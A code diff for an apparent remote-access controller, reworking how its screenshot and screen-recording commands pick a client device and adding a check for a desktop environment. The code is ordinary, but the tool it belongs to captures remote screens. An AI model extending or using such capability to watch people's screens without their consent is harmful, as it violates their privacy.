@@ -147,22 +147,21 @@ class CommandHandler:
 
     @command(['screenshot', 'ss'], accept_args = True)
     def screenshot(self, *clientID) -> None:
-        if (self.NetServer._selectedClient):
-            self.NetServer._selectedClient.socket.send_packet('request_screenshot')
-            logger.info('Waiting for client\'s response')
-            self.NetServer._waitingForResponse = True
-
-            while self.NetServer._waitingForResponse:
-                time_sleep(1)
-
-            return
-
         if not clientID:
-            logger.error('Missing argument: Client Unique ID')
-            return
+            if (not self.NetServer._selectedClient):
+                logger.error('Missing argument: Client Unique ID')
+                return
 
-        if not (selectedCli := self.bucket.get_client_by_id(clientID)):
-            logger.error('Client ID not found'); return
+            selectedCli = self.NetServer._selectedClient
+
+        else:
+            if not (selectedCli := self.bucket.get_client_by_id(clientID)):
+                logger.error('Client ID not found')
+                return
+
+        if (selectedCli.additionalData['Desktop Environment'] == '1'):
+            logger.error('This client does not have desktop environment')
+            return
 
         data = selectedCli.catch_response('request_screenshot')
         logger.info('Waiting for client\'s response')
@@ -182,12 +181,17 @@ class CommandHandler:
         selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
             if self.NetServer._selectedClient else self.bucket.get_client_by_id(clientID)
 
-        environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
-        pygame = __import__('pygame')
-
         if (selectedClient == None):
             logger.error('Missing argument: Client Unique ID')
             return
+
+        else:
+            if (selectedClient.additionalData['Desktop Environment'] == '1'):
+                logger.error('This device does not have desktop environment')
+                return
+
+        environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
+        pygame = __import__('pygame')
 
         selectedClient.socket.send_packet('start_recording')
         data_collection: list[bytes] = list()
